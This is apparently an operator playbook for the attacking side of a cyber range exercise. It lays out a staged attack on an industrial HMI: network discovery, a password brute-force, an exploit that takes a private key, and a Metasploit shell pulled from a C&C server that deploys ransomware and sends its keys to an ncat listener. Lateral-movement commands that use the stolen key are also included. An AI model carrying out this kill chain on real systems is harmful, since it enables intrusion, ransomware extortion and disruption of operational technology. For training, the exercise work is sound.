# Playbook 
For WienIT Planspiel

1. Request JUMPHOST, ATTACKER0, ATTACKER1, LANTURTLE ip from cyberrange admins (benni, lenni, hoti, ...)
2. Fill in the correct IPs here:
```
export CR_JUMPHOST_USER=ait
export CR_ATTACKER_USER=ait
export CR_JUMPHOST=10.17.2.127
export CR_ATTACKER1=240.70.26.128
export CR_ATTACKER0=240.64.78.32
export CR_LANTURTLE=240.71.161.32

alias ssh-attacker1="ssh -J \${CR_JUMPHOST_USER}@\${CR_JUMPHOST} \${CR_ATTACKER_USER}@\${CR_ATTACKER1}"
alias ssh-attacker0="ssh -J \${CR_JUMPHOST_USER}@\${CR_JUMPHOST} \${CR_ATTACKER_USER}@\${CR_ATTACKER0}"
alias ssh-lanturtle="ssh -J \${CR_JUMPHOST_USER}@\${CR_JUMPHOST} \${CR_ATTACKER_USER}@\${CR_LANTURTLE}"
```
3. Start ssh-keygen and add key
```
ssh-agent &
ssh-add ~/.ssh/cyberrange_key
```
4. remove old known_hosts
```
sed -i "/${CR_ATTACKER1}/d" ~/.ssh/known_hosts
sed -i "/${CR_ATTACKER0}/d" ~/.ssh/known_hosts
sed -i "/${CR_LANTURTLE}/d" ~/.ssh/known_hosts
```
5. connect to lan turtle ```ssh-lanturtle```
6. change to opt and run code
```
cd /opt/ot_attack
```
7. run discovery ```sudo ./01_discovery.sh``` and verify that all scans look like they were done
8. after a little while run bruteforce on hmi ```sudo ./02_bruteforce.sh ``` and verify that the password has been found
9. after a little while run the exploit phase with ```sudo ./03_exploit_hmi.sh``` ask if you are able to exploit the hmi and extract the private key
10. the last phase downloads a metasploit shell from the attacker-1 server, the shell is saved as system service and executed. this automatically spawns a metasploit session to attacker-1 which pushes a ransomware to the computer. The ransomware is immediately executed. So BE SURE that you want to blow off the ransomwhere by executing ```sudo ./04_upload_ranmosmware.sh```. if this does not work, someone fixed the firewall by blocking all outgoing ports in the meantime, or metasploit or apache2 on attacker-1 is not running. in this case you have to be creative, either by fixing attaker-1 or you have to manually copy and run the ransomware from "$CR_ATTACKER1:/opt/ot_attack/dist/ransomware" to all of the hosts you want to attack by using your LANTURTLE. you can connect to all of your victims by using the key you extracted during 03_exploit_hmi.sh. just check all the infos from 04_upload_ransomware.sh you will find out how to fix this ;)
11. attacker-0 has an open port, where it receives the ransomware encryption keys via simple a tcp-stream. verify that you've got several keys on attacker-0
```
ssh-attacker0
cat /opt/ot_attack/ransomw-keys.txt
```

# Overview
* attacker-1 is a C&C server, it hosts 
  * apache2 on port 80
    * find logs here: /var/log/apache2/
    * find utils that will be downloaded from this machine during the game here: /var/www/html/
  * metasploit on port 443
    * metasploit is running as a service and you will find the logs here: systemctl status metasploit-attacker.service
    * or here: journalctl -u metasploit-attacker.service
* attacker-0 is a C&C server, which hosts
  * ncat on port 80 to retreive the "generated" malware keys, there is a 
     * log / service file here: systemctl status auto-ncat.service
        * or here journalctl -u auto-ncat.service
     * key file here: cat /opt/ot_attack/ransomw-keys.txt 
* our lan turtle is the attacker machine and hosts 01-04 scripts under /opt/ot_attack, the config file can be sourced and used
      
# emergency snippets ssh-copy
```
rsync -r -e "ssh -J \${CR_JUMPHOST_USER}@\${CR_JUMPHOST}" ${CR_JUMPHOST_USER}@${CR_ATTACKER1}:/opt/ot_attack /tmp
rsync -r -e "ssh -J \${CR_JUMPHOST_USER}@\${CR_JUMPHOST}" /tmp/ot_attack ${CR_JUMPHOST_USER}@${CR_LANTURTLE}:/tmp/ot_attack
sudo rsync -r -e "ssh -o "StrictHostKeyChecking=no" -i hmi-ssh.key"  /tmp/ot_attack $VICTIM_SERVER_USER@$LAPTOP_IP:/tmp/ot_attack
. /opt/ot_attack/
sudo ssh -o "StrictHostKeyChecking=no" -i hmi-ssh.key $VICTIM_SERVER_USER@$LAPTOP_IP
```
